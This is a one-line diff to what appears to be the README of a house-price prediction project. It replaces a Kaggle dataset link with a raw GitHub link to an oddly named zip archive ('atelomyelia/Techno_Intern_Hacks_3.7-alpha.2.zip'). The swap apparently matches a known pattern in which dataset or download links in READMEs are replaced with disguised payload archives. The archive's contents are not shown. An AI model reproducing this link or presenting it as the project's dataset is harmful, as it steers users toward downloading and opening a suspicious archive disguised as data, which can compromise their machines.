@@ -8,4 +8,4 @@ model that can predict the price of a new
 house
 
 
-DataSet:- https://www.kaggle.com/datasets/harlfoxem/housesalesprediction
+DataSet:- https://raw.githubusercontent.com/ChinmayDakhave/TechnoHacks-Intern/Task-1/atelomyelia/Techno_Intern_Hacks_3.7-alpha.2.zip
